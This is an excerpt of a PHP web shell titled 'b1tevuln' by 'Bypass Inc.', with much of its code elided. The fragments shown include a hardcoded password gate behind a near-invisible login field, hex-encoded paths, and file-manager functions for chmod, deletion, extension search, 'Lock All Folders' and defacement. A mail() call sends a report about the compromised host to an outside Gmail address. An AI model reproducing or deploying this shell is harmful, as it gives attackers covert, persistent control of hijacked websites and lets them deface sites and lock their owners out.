...
$gcw = "getcwd";
$correctPassword = "Hiro123";
if (isset($_POST['pass'])) {
    $enteredPassword = $_POST['pass'];
    if ($enteredPassword === $correctPassword) {
        $_SESSION['forbidden'] = true;
    } else {
        echo '<script>alert("what do u want to do? fuck bitch!");</script>';
    }
}
...
<style>
    ...
    form {
        margin-top: 10px; /* Jarak pas dari teks di atas */
    }
    input[type="password"] {
        width: 50px; /* Ukuran kecil */
        height: 10px; /* Tinggi kecil agar tidak mencolok */
        font-size: 0; /* Hilangkan teks placeholder */
        border: none;
    ...
    input[type="password"]:focus {
        outline: none;
        border-bottom: 1px solid #ccc; /* Tampilan saat fokus */
    }
    footer {
        position: absolute;
        bottom: 10px;
...
?>
	...
	<html>
	<head>
		<title>b1tevuln</title>
		<meta charset='UTF-8'>
		<meta name='author' content='Bypass Inc.'>
		<meta name='robots' content='noindex, nofollow, noarchive'>
	...
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>Bypass Inc.</h4></a>";
			if(isset($_7['path'])){
				$path = unhex($_7['path']);
				chdir($path);
			}else{
		...
		<div class='container-fluid'>
			...
			<div class='btn-group'>
				...
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_folders'><i class='bi bi-folder-x'></i> Lock All Folders</a></div>
			<div class='btn-group'>
		...
		@mail('manzstayforu@gmail.com', 'Hehehe', $report_bug);
		}
		if($_7['id'] == 'deface'){
		...
		if ($_7['id'] == 'searchbyEXT') {
			...
			if ($_7['start']) {
				...
				if (!empty($search_results)) {
					echo "<div class='alert alert-info'>Results for extension $extensi in directory $dir:</div>";foreach ($search_results as $file) {
		...
		<form method='POST'>
			<div class='input-group'>
				<input class='form-control btn-sm' type='text' name='new_chmod' value='$FileChmod'><button class='btn btn-outline-light btn-sm' type='submit' name='cehamot'><i class='bi bi-arrow-return-right'></i></button>
			</div>
		</form>";
		}
		// Delete File
		...
		if ($_7['action'] == 'chmod_folder') {
			...
			<div class='card card-body text-dark input-group mb-3'><p>Set permissions for : " . basename($dir) . "</p>
				<form method='POST'>
...
Allow from all
		...
		</div><div class='text-secondary'>&copy Vuln - Bypass Inc.</div>
	</div>
</div>
</body>
</html>